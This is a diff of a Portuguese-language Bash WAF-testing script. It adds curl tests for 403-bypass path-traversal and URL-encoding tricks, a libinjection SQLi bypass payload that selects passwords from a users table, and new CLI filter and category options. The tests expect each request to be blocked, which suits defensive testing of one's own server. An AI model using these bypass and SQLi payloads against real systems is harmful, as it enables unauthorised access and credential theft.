+    test_curl "403: %09;" "block" -A "$UA" -Lk --path-as-is "${URL}%09;"
+    test_curl "403: %20 (space)" "block" -A "$UA" -Lk --path-as-is "${URL}%20"
+    test_curl "403: %23%3f (#?)" "block" -A "$UA" -Lk --path-as-is "${URL}%23%3f"
+    test_curl "403: %252f%252f (//)" "block" -A "$UA" -Lk --path-as-is "${URL}%252f%252f"
+    test_curl "403: %252f/" "block" -A "$UA" -Lk --path-as-is "${URL}%252f/"
+    test_curl "403: %2e%2e (..)" "block" -A "$UA" -Lk --path-as-is "${URL}%2e%2e"
+    test_curl "403: %2e%2e/" "block" -A "$UA" -Lk --path-as-is "${URL}%2e%2e/"
+    test_curl "403: %2f (/)" "block" -A "$UA" -Lk --path-as-is "${URL}%2f"
+    test_curl "403: %2f%20%23" "block" -A "$UA" -Lk --path-as-is "${URL}%2f%20%23"
+    test_curl "403: %2f%23" "block" -A "$UA" -Lk --path-as-is "${URL}%2f%23"
+    test_curl "403: %2f%2f (//)" "block" -A "$UA" -Lk --path-as-is "${URL}%2f%2f"
+    
+    print_subsection "URL Encode Bypass - Semicolon Tricks"
+    test_curl "403: %3b (;)" "block" -A "$UA" -Lk --path-as-is "${URL}%3b"
+    test_curl "403: %3b%09" "block" -A "$UA" -Lk --path-as-is "${URL}%3b%09"
+    test_curl "403: %3b%2f%2e%2e" "block" -A "$UA" -Lk --path-as-is "${URL}%3b%2f%2e%2e"
+    test_curl "403: %3b/.." "block" -A "$UA" -Lk --path-as-is "${URL}%3b/.."
+    test_curl "403: %3b//%2f../" "block" -A "$UA" -Lk --path-as-is "${URL}%3b//%2f../"
+    test_curl "403: %3f%23 (?#)" "block" -A "$UA" -Lk --path-as-is "${URL}%3f%23"
+    test_curl "403: %3f%3f (??)" "block" -A "$UA" -Lk --path-as-is "${URL}%3f%3f"
+    
+    print_subsection "URL Encode Bypass - Path Traversal Variations"
+    test_curl "403: .. (dotdot)" "block" -A "$UA" -Lk --path-as-is "${URL}.."
+    test_curl "403: ..%00/;" "block" -A "$UA" -Lk --path-as-is "${URL}..%00/;"
+    test_curl "403: ..%00;/" "block" -A "$UA" -Lk --path-as-is "${URL}..%00;/"
+    test_curl "403: ..%09" "block" -A "$UA" -Lk --path-as-is "${URL}..%09"
+    test_curl "403: ..%0d/;" "block" -A "$UA" -Lk --path-as-is "${URL}..%0d/;"
+    test_curl "403: ..%0d;/" "block" -A "$UA" -Lk --path-as-is "${URL}..%0d;/"
+    test_curl "403: ..%5c/" "block" -A "$UA" -Lk --path-as-is "${URL}..%5c/"
+    test_curl "403: ..%ff/;" "block" -A "$UA" -Lk --path-as-is "${URL}..%ff/;"
+    test_curl "403: ..%ff;/" "block" -A "$UA" -Lk --path-as-is "${URL}..%ff;/"
+    test_curl "403: ..;%00/" "block" -A "$UA" -Lk --path-as-is "${URL}..;%00/"
+    test_curl "403: ..;%0d/" "block" -A "$UA" -Lk --path-as-is "${URL}..;%0d/"
+    test_curl "403: ..;%ff/" "block" -A "$UA" -Lk --path-as-is "${URL}..;%ff/"
+    
+    print_subsection "URL Encode Bypass - Slash Variations"
+    test_curl "403: /%20#" "block" -A "$UA" -Lk --path-as-is "${URL}/%20#"
+    test_curl "403: /%20%23" "block" -A "$UA" -Lk --path-as-is "${URL}/%20%23"
+    test_curl "403: /%252e%252e%252f/" "block" -A "$UA" -Lk --path-as-is "${URL}/%252e%252e%252f/"
+    test_curl "403: /%252e%252e%253b/" "block" -A "$UA" -Lk --path-as-is "${URL}/%252e%252e%253b/"
+    test_curl "403: /%252e%252f/" "block" -A "$UA" -Lk --path-as-is "${URL}/%252e%252f/"
+    test_curl "403: /%252e%253b/" "block" -A "$UA" -Lk --path-as-is "${URL}/%252e%253b/"
+    test_curl "403: /%252e/" "block" -A "$UA" -Lk --path-as-is "${URL}/%252e/"
+    test_curl "403: /%252f" "block" -A "$UA" -Lk --path-as-is "${URL}/%252f"
+    test_curl "403: /%2e%2e" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e%2e"
+    test_curl "403: /%2e%2e%3b/" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e%2e%3b/"
+    test_curl "403: /%2e%2e/" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e%2e/"
+    test_curl "403: /%2e%2f/" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e%2f/"
+    test_curl "403: /%2e%3b/" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e%3b/"
+    test_curl "403: /%2e%3b//" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e%3b//"
+    test_curl "403: /%2e/" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e/"
+    test_curl "403: /%2e//" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e//"
+    test_curl "403: /%2f" "block" -A "$UA" -Lk --path-as-is "${URL}/%2f"
+    test_curl "403: /%3b/" "block" -A "$UA" -Lk --path-as-is "${URL}/%3b/"
+    
+    print_subsection "URL Encode Bypass - Parent Directory"
+    test_curl "403: /.." "block" -A "$UA" -Lk --path-as-is "${URL}/.."
+    test_curl "403: /..%2f" "block" -A "$UA" -Lk --path-as-is "${URL}/..%2f"
+    test_curl "403: /..%2f..%2f" "block" -A "$UA" -Lk --path-as-is "${URL}/..%2f..%2f"
+    test_curl "403: /..%2f..%2f..%2f" "block" -A "$UA" -Lk --path-as-is "${URL}/..%2f..%2f..%2f"
+    test_curl "403: /../" "block" -A "$UA" -Lk --path-as-is "${URL}/../"
+    test_curl "403: /../../" "block" -A "$UA" -Lk --path-as-is "${URL}/../../"
+    test_curl "403: /../../../" "block" -A "$UA" -Lk --path-as-is "${URL}/../../../"
+    test_curl "403: /../../..//" "block" -A "$UA" -Lk --path-as-is "${URL}/../../..//"
+    test_curl "403: /../..//" "block" -A "$UA" -Lk --path-as-is "${URL}/../..//"
+    test_curl "403: /../..//../" "block" -A "$UA" -Lk --path-as-is "${URL}/../..//../"
+    
+    print_subsection "URL Encode Bypass - Semicolon Path Tricks"
+    test_curl "403: /../..;/" "block" -A "$UA" -Lk --path-as-is "${URL}/../..;/"
+    test_curl "403: /.././../" "block" -A "$UA" -Lk --path-as-is "${URL}/.././../"
+    test_curl "403: /../.;/../" "block" -A "$UA" -Lk --path-as-is "${URL}/../.;/../"
+    test_curl "403: /..//" "block" -A "$UA" -Lk --path-as-is "${URL}/..//"
+    test_curl "403: /..//../" "block" -A "$UA" -Lk --path-as-is "${URL}/..//../"
+    test_curl "403: /..//../../" "block" -A "$UA" -Lk --path-as-is "${URL}/..//../../"
+    test_curl "403: /..//..;/" "block" -A "$UA" -Lk --path-as-is "${URL}/..//..;/"
+    test_curl "403: /../;/" "block" -A "$UA" -Lk --path-as-is "${URL}/../;/"
+    test_curl "403: /../;/../" "block" -A "$UA" -Lk --path-as-is "${URL}/../;/../"
+    
+    print_subsection "URL Encode Bypass - Encoded Semicolon"
+    test_curl "403: /..;%2f" "block" -A "$UA" -Lk --path-as-is "${URL}/..;%2f"
+    test_curl "403: /..;%2f..;%2f" "block" -A "$UA" -Lk --path-as-is "${URL}/..;%2f..;%2f"
+    test_curl "403: /..;%2f..;%2f..;%2f" "block" -A "$UA" -Lk --path-as-is "${URL}/..;%2f..;%2f..;%2f"
+    test_curl "403: /..;/../" "block" -A "$UA" -Lk --path-as-is "${URL}/..;/../"
+    test_curl "403: /..;/..;/" "block" -A "$UA" -Lk --path-as-is "${URL}/..;/..;/"
+    test_curl "403: /..;//" "block" -A "$UA" -Lk --path-as-is "${URL}/..;//"
+    test_curl "403: /..;//../" "block" -A "$UA" -Lk --path-as-is "${URL}/..;//../"
+    test_curl "403: /..;//..;/" "block" -A "$UA" -Lk --path-as-is "${URL}/..;//..;/"
+    test_curl "403: /..;/;/" "block" -A "$UA" -Lk --path-as-is "${URL}/..;/;/"
+    test_curl "403: /..;/;/..;/" "block" -A "$UA" -Lk --path-as-is "${URL}/..;/;/..;/"
+    
+    print_subsection "URL Encode Bypass - Double/Triple Slash"
+    test_curl "403: /.//" "block" -A "$UA" -Lk --path-as-is "${URL}/.//"
+    test_curl "403: /.;/" "block" -A "$UA" -Lk --path-as-is "${URL}/.;/"
+    test_curl "403: /.;//" "block" -A "$UA" -Lk --path-as-is "${URL}/.;//"
+    test_curl "403: //.." "block" -A "$UA" -Lk --path-as-is "${URL}//.."
+    test_curl "403: //../../" "block" -A "$UA" -Lk --path-as-is "${URL}//../../"
+    test_curl "403: //..;" "block" -A "$UA" -Lk --path-as-is "${URL}//..;"
+    test_curl "403: //./" "block" -A "$UA" -Lk --path-as-is "${URL}//./"
+    test_curl "403: //.;/" "block" -A "$UA" -Lk --path-as-is "${URL}//.;/"
+    test_curl "403: ///.." "block" -A "$UA" -Lk --path-as-is "${URL}///.."
+    test_curl "403: ///../" "block" -A "$UA" -Lk --path-as-is "${URL}///../"
+    test_curl "403: ///..//" "block" -A "$UA" -Lk --path-as-is "${URL}///..//"
+    test_curl "403: ///..;" "block" -A "$UA" -Lk --path-as-is "${URL}///..;"
+    test_curl "403: ///..;/" "block" -A "$UA" -Lk --path-as-is "${URL}///..;/"
+    test_curl "403: ///..;//" "block" -A "$UA" -Lk --path-as-is "${URL}///..;//"
+    test_curl "403: //;/" "block" -A "$UA" -Lk --path-as-is "${URL}//;/"
+    test_curl "403: /;/" "block" -A "$UA" -Lk --path-as-is "${URL}/;/"
+    test_curl "403: /;//" "block" -A "$UA" -Lk --path-as-is "${URL}/;//"
+    
+    print_subsection "URL Encode Bypass - Special Characters"
+    test_curl "403: ; (semicolon)" "block" -A "$UA" -Lk --path-as-is "${URL};"
+    test_curl "403: ;%09" "block" -A "$UA" -Lk --path-as-is "${URL};%09"
+    test_curl "403: ;%09.." "block" -A "$UA" -Lk --path-as-is "${URL};%09.."
+    test_curl "403: ;%09..;" "block" -A "$UA" -Lk --path-as-is "${URL};%09..;"
+    test_curl "403: ;%09;" "block" -A "$UA" -Lk --path-as-is "${URL};%09;"
+    test_curl "403: ;%2F.." "block" -A "$UA" -Lk --path-as-is "${URL};%2F.."
+    test_curl "403: ;%2f%2e%2e" "block" -A "$UA" -Lk --path-as-is "${URL};%2f%2e%2e"
+    test_curl "403: & (ampersand)" "block" -A "$UA" -Lk --path-as-is "${URL}&"
+    test_curl "403: % (percent)" "block" -A "$UA" -Lk --path-as-is "${URL}%"
+    test_curl "403: ../" "block" -A "$UA" -Lk --path-as-is "${URL}../"
+    test_curl "403: ..%2f" "block" -A "$UA" -Lk --path-as-is "${URL}..%2f"
+    test_curl "403: .././" "block" -A "$UA" -Lk --path-as-is "${URL}.././"
+    test_curl "403: ..%00/" "block" -A "$UA" -Lk --path-as-is "${URL}..%00/"
+    test_curl "403: ..%0d/" "block" -A "$UA" -Lk --path-as-is "${URL}..%0d/"
+    test_curl "403: ..%5c" "block" -A "$UA" -Lk --path-as-is "${URL}..%5c"
+    test_curl "403: ..%ff" "block" -A "$UA" -Lk --path-as-is "${URL}..%ff"
+    
+    print_subsection "URL Encode Bypass - Additional Encodings"
+    test_curl "403: %2e%2e%2f" "block" -A "$UA" -Lk --path-as-is "${URL}%2e%2e%2f"
+    test_curl "403: .%2e/" "block" -A "$UA" -Lk --path-as-is "${URL}.%2e/"
+    test_curl "403: %3f (?)" "block" -A "$UA" -Lk --path-as-is "${URL}%3f"
+    test_curl "403: %26 (&)" "block" -A "$UA" -Lk --path-as-is "${URL}%26"
+    test_curl "403: %23 (#)" "block" -A "$UA" -Lk --path-as-is "${URL}%23"
+    test_curl "403: %2e (.)" "block" -A "$UA" -Lk --path-as-is "${URL}%2e"
+    test_curl "403: /." "block" -A "$UA" -Lk --path-as-is "${URL}/."
+    test_curl "403: ?" "block" -A "$UA" -Lk --path-as-is "${URL}?"
+    test_curl "403: ??" "block" -A "$UA" -Lk --path-as-is "${URL}??"
+    test_curl "403: ???" "block" -A "$UA" -Lk --path-as-is "${URL}???"
+    test_curl "403: //" "block" -A "$UA" -Lk --path-as-is "${URL}//"
+    test_curl "403: /./" "block" -A "$UA" -Lk --path-as-is "${URL}/./"
+    test_curl "403: .//./" "block" -A "$UA" -Lk --path-as-is "${URL}.//./"
+    test_curl "403: //?anything" "block" -A "$UA" -Lk --path-as-is "${URL}//?anything"
+    test_curl "403: #" "block" -A "$UA" -Lk --path-as-is "${URL}#"
+    test_curl "403: /.randomstring" "block" -A "$UA" -Lk --path-as-is "${URL}/.randomstring"
+    test_curl "403: ..;/" "block" -A "$UA" -Lk --path-as-is "${URL}..;/"
+    test_curl "403: .html" "block" -A "$UA" -Lk --path-as-is "${URL}.html"
+    test_curl "403: %20/" "block" -A "$UA" -Lk --path-as-is "${URL}%20/"
+    test_curl "403: .json" "block" -A "$UA" -Lk --path-as-is "${URL}.json"
+    test_curl "403: /*" "block" -A "$UA" -Lk --path-as-is "${URL}/*"
+    test_curl "403: ./." "block" -A "$UA" -Lk --path-as-is "${URL}./."
+    test_curl "403: /*/" "block" -A "$UA" -Lk --path-as-is "${URL}/*/"
+    test_curl "403: /..;/" "block" -A "$UA" -Lk --path-as-is "${URL}/..;/"
+    test_curl "403: //." "block" -A "$UA" -Lk --path-as-is "${URL}//."
+    test_curl "403: ////" "block" -A "$UA" -Lk --path-as-is "${URL}////"
+    
+    print_subsection "SQLi libinjection Bypass (WAF/ModSecurity)"
+    test_curl "403: SQLi 1.e(\")=' bypass" "block" -A "$UA" -Lk "${URL}/'%20or%201.e(%22)%3D'"
+    test_curl "403: SQLi 1.e(ascii" "block" -A "$UA" -Lk "${URL}/1.e(ascii"
+    test_curl "403: SQLi 1.e(substring(" "block" -A "$UA" -Lk "${URL}/1.e(substring("
+    test_curl "403: SQLi full 1.e() bypass" "block" -A "$UA" -Lk "${URL}/1.e(ascii%201.e(substring(1.e(select%20password%20from%20users%20limit%201%201.e%2C1%201.e)%201.e%2C1%201.e%2C1%201.e)1.e)1.e)%20%3D%2070%20or'1'%3D'2'"
+    
+    echo ""
+    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "  ${BOLD}💡 Sobre 403 Bypass:${NC}"
+    echo -e "  ${YELLOW}• Headers IP Spoofing:${NC} Bloqueie headers untrusted via Nginx"
+    echo -e "  ${YELLOW}• Port Bypass:${NC} Não confie em X-Forwarded-Port de IPs externos"
+    echo -e "  ${YELLOW}• URL Encoding:${NC} Normalize URLs antes de processá-las"
+    echo -e "  ${YELLOW}• Path Traversal:${NC} Use realpath() e validação de path"
+    echo -e "  ${YELLOW}• libinjection:${NC} Mantenha WAF/ModSecurity atualizado"
+    echo -e "  ${YELLOW}• Nginx Config:${NC} Use 'merge_slashes on;' e normalize URIs"
+    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+}
+
+#==============================================================================
 # RESUMO FINAL
 #==============================================================================
 print_summary() {
@@ -2110,11 +3308,43 @@ CATEGORY="all"
 
 while [[ $# -gt 0 ]]; do
     case $1 in
-        -h|--help) echo "Uso: $0 [-v] [-o arquivo] [-u num] [-c categoria] <URL>"; exit 0 ;;
+        -h|--help) 
+            echo "Uso: $0 [OPÇÕES] <URL>"
+            echo ""
+            echo "Opções:"
+            echo "  -h, --help              Mostra esta ajuda"
+            echo "  -v, --verbose           Modo verboso"
+            echo "  -o, --output <arquivo>  Salva resultados em arquivo"
+            echo "  -u, --user-agent <num>  Seleciona User-Agent (1-15)"
+            echo "  -c, --category <cat>    Executa categoria específica"
+            echo "  -f, --filter <filtro>   Filtra resultados: all, pass, fail"
+            echo ""
+            echo "Filtros disponíveis:"
+            echo "  all   - Mostra todos os testes (padrão)"
+            echo "  pass  - Mostra apenas testes que PASSARAM"
+            echo "  fail  - Mostra apenas testes que FALHARAM"
+            echo ""
+            echo "Categorias disponíveis:"
+            echo "  all, method, cookie, query, host, uri, header, contenttype,"
+            echo "  encoding, xff, range, smuggling, nginx, php, database, ssrf,"
+            echo "  pathbypass, injection, ratelimit, protocol, hopbyhop, cache,"
+            echo "  contamination, responsesmuggling, h2c, ssi, cdn, xslt, waf,"
+            echo "  ports, ssl, useragent, referer, fakebots, 403bypass,"
+            echo "  clickjacking, secheaders, session, css, email, credentials,"
+            echo "  enumeration, formatstring, csrf"
+            exit 0 
+            ;;
         -v|--verbose) VERBOSE=true; shift ;;
         -o|--output) OUTPUT_FILE="$2"; shift 2 ;;
         -u|--user-agent) UA="${USER_AGENTS[$(($2-1))]}"; shift 2 ;;
         -c|--category) CATEGORY="$2"; shift 2 ;;
+        -f|--filter) 
+            case "$2" in
+                all|pass|fail) FILTER="$2" ;;
+                *) echo -e "${RED}Filtro inválido: $2. Use: all, pass, fail${NC}"; exit 1 ;;
+            esac
+            shift 2 
+            ;;
         -*) echo "Opção desconhecida: $1"; exit 1 ;;
         *) URL="$1"; shift ;;
     esac
@@ -2127,6 +3357,13 @@ show_banner
 [ -z "$UA" ] && select_user_agent
 
 echo -e "${BOLD}Iniciando testes em:${NC} $URL"
+
+# Mostrar filtro ativo
+if [ "$FILTER" = "pass" ]; then
+    echo -e "${BOLD}Filtro ativo:${NC} ${GREEN}Mostrando apenas testes que PASSARAM${NC}"
+elif [ "$FILTER" = "fail" ]; then
+    echo -e "${BOLD}Filtro ativo:${NC} ${RED}Mostrando apenas testes que FALHARAM${NC}"
+fi
 
 # Executar testes baseado na categoria
 case $CATEGORY in
@@ -2165,6 +3402,17 @@ case $CATEGORY in
     xslt|xsltinjection) test_xslt_injection ;;
     waf|wafbypass|proxy) test_waf_bypass ;;
     ports|exposedports|portscan) test_exposed_ports ;;
+    ssl|tls|ssltls|ciphers) test_ssl_tls ;;
+    403bypass|403|forbidden) test_403_bypass ;;
+    clickjacking|xfo|framebusting) test_clickjacking ;;
+    secheaders|securityheaders|headers) test_security_headers ;;
+    session|cookies|cookiesecurity) test_session_security ;;
+    css|cssinjection) test_css_injection ;;
+    email|smtp|imap|emailinjection) test_email_injection ;;
+    credentials|defaultcreds|adminpanels) test_default_credentials ;;
+    enumeration|userenum|accountenum) test_account_enumeration ;;
+    formatstring|printf) test_format_string ;;
+    csrf|xsrf) test_csrf_protection ;;
     all)
         test_all_http_methods
         test_malicious_cookies
@@ -2195,6 +3443,17 @@ case $CATEGORY in
         test_xslt_injection
         test_waf_bypass
         test_exposed_ports
+        test_ssl_tls
+        test_403_bypass
+        test_clickjacking
+        test_security_headers
+        test_session_security
+        test_css_injection
+        test_email_injection
+        test_default_credentials
+        test_account_enumeration
+        test_format_string
+        test_csrf_protection
         test_bad_user_agents
         test_bad_referers
         test_good_bots
